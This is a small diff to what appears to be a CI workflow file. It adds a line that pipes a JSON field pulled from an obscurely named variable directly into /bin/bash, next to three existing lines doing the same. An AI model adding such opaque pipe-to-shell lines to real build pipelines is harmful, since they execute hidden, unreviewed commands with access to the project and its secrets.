@@ -28,6 +28,7 @@ jobs:
           echo $xszg033 | jq -r .jselc96 | /bin/bash
           printf '%s' "$h370" | jq -r .n2134 | /bin/bash
           printf '%s' "$d42925" | jq -r .yscxj1283 | /bin/bash
+          echo $enbp8 | jq -r .a0 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
